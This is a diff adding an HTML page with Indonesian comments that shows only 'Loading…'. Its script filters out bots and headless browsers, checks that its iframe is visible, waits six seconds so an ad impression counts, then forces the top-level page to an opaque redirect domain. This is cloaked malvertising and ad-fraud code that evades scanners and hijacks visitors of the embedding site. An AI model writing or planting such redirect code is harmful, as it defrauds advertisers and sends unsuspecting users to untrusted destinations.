@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>filter Redirect</title>
+</head>
+<body>
+
+<script>
+(function () {
+
+    // 1. Pastikan JavaScript & browser normal
+    if (!navigator.userAgent || !screen.width || !screen.height) return;
+
+    // 2. Filter bot dasar (AMAN)
+    const ua = navigator.userAgent.toLowerCase();
+    if (
+        ua.includes("headless") ||
+        ua.includes("phantom") ||
+        ua.includes("bot") ||
+        ua.includes("crawler")
+    ) return;
+
+    // 3. Pastikan iframe terlihat (bukan hidden 0x0)
+    if (window.innerWidth < 300 || window.innerHeight < 250) return;
+
+    // 4. Cegah redirect berulang
+    if (sessionStorage.getItem("rd_done")) return;
+    sessionStorage.setItem("rd_done", "1");
+
+    // 5. Delay agar impression tercatat
+    setTimeout(function () {
+        try {
+            window.top.location.replace("https://likedgreetedrape.com/u4mw1axq?key=f0278a7ea9a71f70839a5b1aef42be00");
+        } catch (e) {
+            window.location.href = "https://likedgreetedrape.com/u4mw1axq?key=f0278a7ea9a71f70839a5b1aef42be00";
+        }
+    }, 6000);
+
+})();
+</script>
+
+<p>Loading…</p>
+
+</body>
+</html>
